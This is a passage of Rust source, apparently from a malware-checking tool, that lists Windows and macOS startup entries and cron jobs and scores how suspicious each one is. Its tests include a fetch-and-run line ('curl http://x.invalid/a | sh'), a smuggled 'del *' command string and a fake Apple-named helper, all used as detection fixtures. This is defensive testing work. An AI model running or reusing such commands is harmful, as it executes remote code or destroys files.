                ..Candidate::default()
            };
            if path
                .extension()
                .is_some_and(|e| e.eq_ignore_ascii_case("lnk"))
            {
                c.unresolved = Some("This is a shortcut. The Nex does not read where a shortcut leads yet, so the program it starts was not checked.".into());
            } else if fs::symlink_metadata(&path).is_ok_and(|m| m.is_file()) {
                c.program = Some(clean(&path.display().to_string(), 2 * MAX_TEXT));
            } else {
                continue;
            }
            found.push(c);
        }
    }

    pub(super) fn collect(found: &mut Found, startup_dir: Option<&Path>) {
        if let Some(dir) = startup_dir {
            return scan_startup_folder(found, dir, "you");
        }
        for (machine, subkey, kind) in [
            (false, RUN, "run_key"),
            (false, RUN_ONCE, "run_once_key"),
            (true, RUN, "run_key"),
            (true, RUN_ONCE, "run_once_key"),
            (true, RUN_32, "run_key"),
            (true, RUN_ONCE_32, "run_once_key"),
        ] {
            scan_key(found, machine, subkey, kind);
        }
        for (var, rest, runs_as) in [
            (
                "APPDATA",
                r"Microsoft\Windows\Start Menu\Programs\Startup",
                "you",
            ),
            (
                "ProgramData",
                r"Microsoft\Windows\Start Menu\Programs\Startup",
                "every user",
            ),
        ] {
            if let Some(base) = std::env::var_os(var) {
                scan_startup_folder(found, &Path::new(&base).join(rest), runs_as);
            }
        }
        found.unreadable(
            "Services that start automatically",
            "This version does not check them yet.",
        );
        found.unreadable("Scheduled tasks", "This version does not check them yet.");
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn args(list: &[&str]) -> Vec<String> {
        list.iter().map(|s| s.to_string()).collect()
    }

    #[test]
    fn windows_command_lines_are_split_safely() {
        let files = ["C:\\Program Files\\A B\\a.exe", "C:\\Tools\\t.exe"];
        let exists = |p: &str| files.contains(&p);
        let quoted =
            parse_command_line("\"C:\\Program Files\\A B\\a.exe\" /silent \"x y\"", &exists);
        assert_eq!(quoted.program, "C:\\Program Files\\A B\\a.exe");
        assert_eq!(quoted.arguments, args(&["/silent", "x y"]));
        assert!(!quoted.unquoted_spaces);
        let unquoted = parse_command_line("C:\\Program Files\\A B\\a.exe -x", &exists);
        assert_eq!(unquoted.program, "C:\\Program Files\\A B\\a.exe");
        assert_eq!(unquoted.arguments, args(&["-x"]));
        assert!(unquoted.unquoted_spaces);
        let plain = parse_command_line("C:\\Tools\\t.exe --a --b", &exists);
        assert_eq!(
            (plain.program.as_str(), plain.unquoted_spaces),
            ("C:\\Tools\\t.exe", false)
        );
        // Nothing exists: the first word is the program, never a shell string.
        let gone = parse_command_line("C:\\Nope\\n.exe a;b & del *", &|_| false);
        assert_eq!(gone.program, "C:\\Nope\\n.exe");
        assert_eq!(gone.arguments, args(&["a;b", "&", "del", "*"]));
        // No closing quote, empty, and only spaces.
        assert_eq!(
            parse_command_line("\"C:\\a b\\c.exe", &|_| false).program,
            "C:\\a b\\c.exe"
        );
        assert_eq!(parse_command_line("   ", &|_| false).program, "");
        assert_eq!(
            split_arguments(r#"a "b \"c\" d" e"#),
            args(&["a", "b \"c\" d", "e"])
        );
    }

    #[test]
    fn environment_variables_expand_only_when_known() {
        let lookup = |name: &str| (name == "APPDATA").then(|| "C:\\U\\AppData".to_string());
        assert_eq!(
            expand_env("%APPDATA%\\x.exe", &lookup),
            "C:\\U\\AppData\\x.exe"
        );
        assert_eq!(
            expand_env("%NOPE%\\x.exe 100%", &lookup),
            "%NOPE%\\x.exe 100%"
        );
        assert_eq!(expand_env("%%", &lookup), "%%");
    }

    #[test]
    fn risky_places_and_borrowed_names_are_spotted() {
        for (path, want) in [
            ("/tmp/a", Some("temp")),
            ("/private/var/folders/x/T/a", Some("temp")),
            ("C:\\Users\\me\\AppData\\Local\\Temp\\a.exe", Some("temp")),
            ("/Users/me/Downloads/a", Some("downloads")),
            ("/Users/me/.cache/a", Some("hidden")),
            ("/usr/local/bin/.agent", Some("hidden")),
            ("/Applications/Foo.app/Contents/MacOS/foo", None),
            ("C:\\Program Files\\Foo\\foo.exe", None),
            ("/bin/ls", None),
        ] {
            assert_eq!(risky_location(path), want, "{path}");
        }
        assert_eq!(claimed_vendor("com.apple.fake"), Some("Apple"));
        assert_eq!(claimed_vendor("MicrosoftEdgeUpdate"), Some("Microsoft"));
        assert_eq!(claimed_vendor("com.example.apple"), None);
    }

    #[test]
    fn interpreters_and_their_scripts_are_found() {
        assert!(
            is_interpreter("python3.12") && is_interpreter(&program_stem("C:\\x\\PowerShell.EXE"))
        );
        assert!(!is_interpreter("ls"));
        let sh = script_target("sh", &args(&["-x", "/opt/run.sh", "a"]));
        assert_eq!(sh, ("sh".into(), Target::Script("/opt/run.sh".into())));
        assert_eq!(
            script_target("bash", &args(&["-c", "echo hi"])).1,
            Target::Inline
        );
        let env = script_target("env", &args(&["FOO=1", "python3", "/opt/a.py"]));
        assert_eq!(env, ("python3".into(), Target::Script("/opt/a.py".into())));
        let ps = script_target("powershell", &args(&["-NoProfile", "-File", "C:\\a.ps1"]));
        assert_eq!(ps.1, Target::Script("C:\\a.ps1".into()));
        assert_eq!(
            script_target("cmd", &args(&["/c", "a.bat"])).1,
            Target::Inline
        );
        assert_eq!(script_target("sh", &[]).1, Target::Nothing);
    }

    #[test]
    fn crontab_lines_become_jobs() {
        let text = "# comment\nMAILTO=me\nPATH=/usr/bin\n\n*/5 * * * * /opt/a.sh --x\n@reboot /opt/b\n1 2 3 4\n";
        let jobs = parse_crontab(text);
        assert_eq!(
            jobs,
            [
                ("*/5 * * * *".to_string(), "/opt/a.sh --x".to_string()),
                ("@reboot".to_string(), "/opt/b".to_string())
            ]
        );
    }

    #[test]
    fn a_report_is_cut_to_its_limits_and_has_a_stable_shape() {
        let item = StartupItem {
            name: "x\ny".repeat(500),
            kind: "cron".into(),
            location: "l".into(),
            program: Some("/p".into()),
            arguments: vec!["a".repeat(1000); 40],
            script: None,
            enabled: Some(true),
            exists: true,
            trusted: false,
            verdict: Verdict::WorthALook,
            score: None,
            reasons: vec!["r".into(); 30],
            allowed: false,
            runs_as: "you".into(),
        };
        let mut report = StartupReport {
            items: vec![item; MAX_ITEMS + 5],
            ..StartupReport::default()
        };
        report.clamp();
        assert!(report.truncated && report.items.len() == MAX_ITEMS);
        let first = &report.items[0];
        assert!(first.name.chars().count() <= MAX_TEXT && !first.name.contains('\n'));
        assert_eq!(
            (first.arguments.len(), first.reasons.len()),
            (MAX_ARGS, MAX_REASONS)
        );
        assert!(first.arguments[0].chars().count() <= MAX_TEXT);
        let json = serde_json::to_value(first).unwrap();
        let mut keys: Vec<&str> = json
            .as_object()
            .unwrap()
            .keys()
            .map(String::as_str)
            .collect();
        keys.sort();
        assert_eq!(
            keys,
            [
                "allowed",
                "arguments",
                "enabled",
                "exists",
                "kind",
                "location",
                "name",
                "program",
                "reasons",
                "runs_as",
                "score",
                "script",
                "trusted",
                "verdict"
            ]
        );
        assert_eq!(json["verdict"], "worth_a_look");
        let top: Vec<String> = serde_json::to_value(&report)
            .unwrap()
            .as_object()
            .unwrap()
            .keys()
            .cloned()
            .collect();
        assert_eq!(top.len(), 4);
    }

    #[test]
    fn digests_parse_only_when_exact() {
        assert_eq!(digest_of(&"ab".repeat(32)), Some([0xab; 32]));
        assert_eq!(digest_of("ab"), None);
        assert_eq!(digest_of(&"zz".repeat(32)), None);
    }

    #[cfg(target_os = "macos")]
    mod on_disk {
        use super::*;
        use std::collections::BTreeMap;
        use std::os::unix::fs::{symlink, PermissionsExt};
        use std::process::Command;

        fn scratch(tag: &str) -> PathBuf {
            let dir =
                std::env::temp_dir().join(format!("thenex-startup-{tag}-{}", std::process::id()));
            let _ = fs::remove_dir_all(&dir);
            fs::create_dir_all(dir.join("launch")).unwrap();
            dir
        }

        fn plist(label: &str, program: &str, args: &[&str], extra: &str) -> String {
            let args: String = args
                .iter()
                .map(|a| format!("<string>{a}</string>"))
                .collect();
            format!(
                "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"><plist version=\"1.0\"><dict><key>Label</key><string>{label}</string><key>ProgramArguments</key><array><string>{program}</string>{args}</array>{extra}</dict></plist>"
            )
        }

        fn run_in(dir: &Path, limits: Limits) -> StartupReport {
            let cfg = Arc::new(AppConfig::for_base_dir(&dir.join("TheNex")));
            let scanner = Arc::new(BinaryAiScanner::heuristic_only());
            list(&cfg, &scanner, Some(&dir.join("launch")), limits)
        }

        fn item<'a>(report: &'a StartupReport, name: &str) -> &'a StartupItem {
            report
                .items
                .iter()
                .find(|i| i.name == name)
                .unwrap_or_else(|| panic!("{name} missing: {report:?}"))
        }

        fn snapshot(dir: &Path) -> BTreeMap<PathBuf, (u64, std::time::SystemTime)> {
            let mut out = BTreeMap::new();
            let mut stack = vec![dir.to_path_buf()];
            while let Some(next) = stack.pop() {
                for entry in fs::read_dir(&next).unwrap().flatten() {
                    let meta = fs::symlink_metadata(entry.path()).unwrap();
                    out.insert(entry.path(), (meta.len(), meta.modified().unwrap()));
                    if meta.is_dir() {
                        stack.push(entry.path());
                    }
                }
            }
            out
        }

        #[test]
        fn definitions_good_bad_and_hostile_are_each_reported_and_nothing_changes() {
            let dir = scratch("all");
            let launch = dir.join("launch");
            fs::write(
                launch.join("good.plist"),
                plist(
                    "com.example.good",
                    "/bin/ls",
                    &["-l"],
                    "<key>RunAtLoad</key><true/>",
                ),
            )
            .unwrap();
            // Binary property list.
            let xml = dir.join("bin-src.plist");
            fs::write(
                &xml,
                plist(
                    "com.example.binary",
                    "/bin/ls",
                    &[],
                    "<key>Disabled</key><true/>",
                ),
            )
            .unwrap();
            let status = Command::new("/usr/bin/plutil")
                .args(["-convert", "binary1", "-o"])
                .arg(launch.join("binary.plist"))
                .arg(&xml)
                .status()
                .unwrap();
            assert!(status.success());
            fs::write(
                launch.join("broken.plist"),
                b"<plist><dict><key>Label</key>",
            )
            .unwrap();
            fs::write(launch.join("garbage.plist"), [0xffu8, 0xfe, 0, 1, 2]).unwrap();
            fs::write(
                launch.join("missing.plist"),
                plist("com.example.missing", "/nonexistent/thing", &[], ""),
            )
            .unwrap();
            fs::write(
                launch.join("huge.plist"),
                vec![b' '; MAX_DEFINITION_BYTES as usize + 1],
            )
            .unwrap();
            // A link to a real definition is followed; a link to a pipe, a pipe and a folder are not opened.
            symlink(xml.as_path(), launch.join("link.plist")).unwrap();
            let fifo = dir.join("pipe");
            let c = std::ffi::CString::new(fifo.to_str().unwrap()).unwrap();
            // SAFETY: valid NUL-terminated path.
            assert_eq!(unsafe { libc::mkfifo(c.as_ptr(), 0o600) }, 0);
            symlink(&fifo, launch.join("linkpipe.plist")).unwrap();
            let direct = launch.join("pipe.plist");
            let c = std::ffi::CString::new(direct.to_str().unwrap()).unwrap();
            // SAFETY: valid NUL-terminated path.
            assert_eq!(unsafe { libc::mkfifo(c.as_ptr(), 0o600) }, 0);
            fs::create_dir(launch.join("folder.plist")).unwrap();
            fs::write(launch.join("ignored.txt"), b"not a definition").unwrap();

            let before = snapshot(&dir);
            let report = run_in(&dir, Limits::default());
            assert_eq!(snapshot(&dir), before, "listing must not touch any file");
            assert!(
                !dir.join("TheNex").exists(),
                "no data folder, no event, no quarantine"
            );

            let good = item(&report, "com.example.good");
            assert_eq!(
                (good.verdict, good.trusted, good.exists, good.enabled),
                (Verdict::NothingFound, true, true, Some(true))
            );
            assert_eq!(
                (
                    good.program.as_deref(),
                    good.arguments.as_slice(),
                    good.runs_as.as_str()
                ),
                (Some("/bin/ls"), &["-l".to_string()][..], "you")
            );
            let binary = item(&report, "com.example.binary");
            assert_eq!(binary.enabled, Some(false));
            let missing = item(&report, "com.example.missing");
            assert_eq!(
                (missing.verdict, missing.exists),
                (Verdict::WorthALook, false)
            );
            assert!(missing.reasons[0].contains("not there"));
            assert_eq!(
                report.items.len(),
                4,
                "good, binary, the followed link and missing: {report:?}"
            );
            let bad: Vec<String> = report
                .unreadable
                .iter()
                .map(|u| u.place.rsplit('/').next().unwrap().to_string())
                .collect();
            for name in [
                "broken.plist",
                "garbage.plist",
                "huge.plist",
                "linkpipe.plist",
                "pipe.plist",
                "folder.plist",
            ] {
                assert!(
                    bad.contains(&name.to_string()),
                    "{name} should be unreadable: {bad:?}"
                );
            }
            assert!(!bad.contains(&"ignored.txt".to_string()));
            assert_eq!(report.unreadable.len(), 6);
            assert!(report
                .items
                .iter()
                .all(|i| i.verdict.rank() >= report.items[0].verdict.rank()));
            let _ = fs::remove_dir_all(&dir);
        }

        #[test]
        fn interpreters_scripts_and_borrowed_names_are_called_out() {
            let dir = scratch("risky");
            let launch = dir.join("launch");
            let script = dir.join("job.sh");
            fs::write(&script, "#!/bin/sh\necho hi\n").unwrap();
            let fake = dir.join("fake-helper");
            fs::write(&fake, "#!/bin/sh\necho hi\n").unwrap();
            fs::set_permissions(&fake, fs::Permissions::from_mode(0o755)).unwrap();
            let write = |file: &str, body: String| fs::write(launch.join(file), body).unwrap();
            write(
                "a.plist",
                plist(
                    "com.example.script",
                    "/bin/sh",
                    &[script.to_str().unwrap()],
                    "",
                ),
            );
            write(
                "b.plist",
                plist("com.example.gone", "/bin/sh", &["/nonexistent/job.sh"], ""),
            );
            write(
                "c.plist",
                plist(
                    "com.example.fetch",
                    "/bin/sh",
                    &["-c", "curl http://x.invalid/a | sh"],
                    "",
                ),
            );
            write(
                "d.plist",
                plist("com.apple.fake.helper", fake.to_str().unwrap(), &[], ""),
            );
            write(
                "e.plist",
                plist("com.apple.real.helper", "/bin/ls", &[], ""),
            );
            write("f.plist", plist("com.example.loose", "/bin/ls", &[], ""));
            fs::set_permissions(launch.join("f.plist"), fs::Permissions::from_mode(0o666)).unwrap();

            let report = run_in(&dir, Limits::default());
            let with_script = item(&report, "com.example.script");
            assert_eq!(with_script.script.as_deref(), script.to_str());
            assert!(with_script.trusted, "the interpreter is trusted");
            assert!(with_script
                .reasons
                .iter()
                .any(|r| r.contains("does not make the script trusted")));
            assert!(
                with_script
                    .reasons
                    .iter()
                    .any(|r| r.contains("temporary folder")),
                "{:?}",
                with_script.reasons
            );
            let gone = item(&report, "com.example.gone");
            assert!(gone
                .reasons
                .iter()
                .any(|r| r.contains("script it runs is not there")));
            let fetch = item(&report, "com.example.fetch");
            assert_eq!(fetch.verdict, Verdict::Suspicious);
            assert!(
                fetch.reasons[0].contains("malware uses"),
                "{:?}",
                fetch.reasons
            );
            let fake_item = item(&report, "com.apple.fake.helper");
            assert_eq!(fake_item.verdict, Verdict::Suspicious);
            assert!(fake_item.reasons[0].contains("comes from Apple"));
            assert!(report
                .items
                .iter()
                .all(|i| i.name != "com.apple.real.helper"));
            assert_eq!(report.skipped, 1);
            let loose = item(&report, "com.example.loose");
            assert_eq!(loose.verdict, Verdict::WorthALook);
            assert!(loose.reasons[0].contains("Other users"));
            assert_eq!(
                report.items[0].verdict,
                Verdict::Suspicious,
                "suspicious first"
            );
            let _ = fs::remove_dir_all(&dir);
        }

        #[test]
        fn the_limits_hold() {
            let dir = scratch("limits");
            for n in 0..5 {
                fs::write(
                    dir.join("launch").join(format!("{n}.plist")),
                    plist(&format!("com.example.n{n}"), "/bin/ls", &[], ""),
                )
                .unwrap();
            }
            let capped = run_in(
                &dir,
                Limits {
                    max_items: 3,
                    ..Limits::default()
                },
            );
            assert_eq!((capped.items.len(), capped.truncated), (3, true));
            let late = run_in(
                &dir,
                Limits {
                    total: Duration::ZERO,
                    ..Limits::default()
                },
            );
            assert_eq!(late.items.len(), 5);
            assert!(late
                .items
                .iter()
                .all(|i| i.verdict == Verdict::NotChecked
                    && i.reasons[0].contains("not enough time")));
            let _ = fs::remove_dir_all(&dir);
        }
    }
}
